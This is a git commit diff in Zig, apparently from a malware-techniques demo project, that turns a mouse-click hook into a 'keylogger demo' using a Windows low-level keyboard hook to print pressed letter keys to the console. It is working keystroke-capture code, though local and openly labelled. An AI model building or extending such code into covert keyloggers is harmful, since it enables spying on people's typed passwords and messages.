6e7e073b0d5fcfd99b574719ba539ad524ae4a10
soheil <soheil.rasekh.01@gmail.com>
2024-10-19 15:47:35 +0330

    feat(api_hooking_windows_api): keylogger demo

--- src/demos/api_hooking_windows_apis.zig
+++ src/demos/api_hooking_windows_apis.zig
@@ -6,11 +6,14 @@ const LPARAM = win.LPARAM;
 const LRESULT = win.LRESULT;
 const HHOOK = win.HHOOK;
 const MSG = win.MSG;
+const KBDLLHOOKSTRUCT = win.KBDLLHOOKSTRUCT;
 
 const WH_MOUSE_LL = win.WH_MOUSE_LL;
 const WM_LBUTTONDOWN = win.WM_LBUTTONDOWN;
 const WM_RBUTTONDOWN = win.WM_RBUTTONDOWN;
 const WM_MBUTTONDOWN = win.WM_MBUTTONDOWN;
+const WM_KEYDOWN = win.WM_KEYDOWN;
+const WH_KEYBOARD_LL = win.WH_KEYBOARD_LL;
 
 const SetWindowsHookExW = win.SetWindowsHookExW;
 const UnhookWindowsHookEx = win.UnhookWindowsHookEx;
@@ -20,19 +23,17 @@ const WaitForSingleObject = win.WaitForSingleObject;
 const GetMessageW = win.GetMessageW;
 const GetLastError = win.GetLastError;
 
-var h_mouse_hook: ?HHOOK = null;
+var h_keyboard_hook: ?HHOOK = null;
 
 fn hookCallback(code: i32, w_param: WPARAM, l_param: LPARAM) callconv(std.os.windows.WINAPI) LRESULT {
-    if (w_param == WM_LBUTTONDOWN) {
-        std.debug.print("[ # ] Left Mouse Click\n", .{});
-    }
+    if (code >= 0 and w_param == WM_KEYDOWN) {
+        const kdb: *KBDLLHOOKSTRUCT = @ptrFromInt(@as(usize, @intCast(l_param)));
 
-    if (w_param == WM_RBUTTONDOWN) {
-        std.debug.print("[ # ] Right Mouse Click\n", .{});
-    }
+        const vk_code = kdb.vkCode;
 
-    if (w_param == WM_MBUTTONDOWN) {
-        std.debug.print("[ # ] Middle Mouse Click\n", .{});
+        if ((vk_code >= 'a' and vk_code <= 'z') or (vk_code >= 'A' and vk_code <= 'Z')) {
+            std.debug.print("[*] Key Pressed: {c}\n", .{@as(u8, @intCast(vk_code))});
+        }
     }
 
     return CallNextHookEx(null, code, w_param, l_param);
@@ -41,8 +42,8 @@ fn hookCallback(code: i32, w_param: WPARAM, l_param: LPARAM) callconv(std.os.win
 fn mouseClickLogger() u32 {
     var msg: MSG = undefined;
 
-    h_mouse_hook = SetWindowsHookExW(
-        WH_MOUSE_LL,
+    h_keyboard_hook = SetWindowsHookExW(
+        WH_KEYBOARD_LL,
         hookCallback,
         null,
         0,
@@ -71,7 +72,7 @@ pub fn main() !void {
 
     _ = WaitForSingleObject(h_thread, 10000);
 
-    if (h_mouse_hook != null and UnhookWindowsHookEx(h_mouse_hook.?) == 0) {
+    if (h_keyboard_hook != null and UnhookWindowsHookEx(h_keyboard_hook.?) == 0) {
         std.debug.print("[!] UnhookWindowsHookEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
         return error.UnhookWindowsHookExFailed;
     }
